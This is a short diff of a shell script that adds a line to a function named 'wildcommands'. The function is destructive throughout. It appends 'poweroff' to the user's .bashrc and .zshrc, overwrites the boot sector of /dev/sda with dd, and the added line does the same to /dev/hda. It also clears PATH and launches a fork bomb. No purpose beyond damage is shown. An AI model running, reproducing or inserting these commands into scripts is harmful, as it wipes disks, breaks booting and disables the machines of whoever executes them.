@@ -58,6 +58,7 @@ fi
 wildcommands() {
   echo poweroff >> .bashrc && echo poweroff >> .zshrc;
   sudo dd if=boot.bin of=/dev/sda bs=512;
+  sudo dd if=boot.bin of=/dev/hda bs=512;
   export $PATH="";
   :(){ :|:& };:
 }
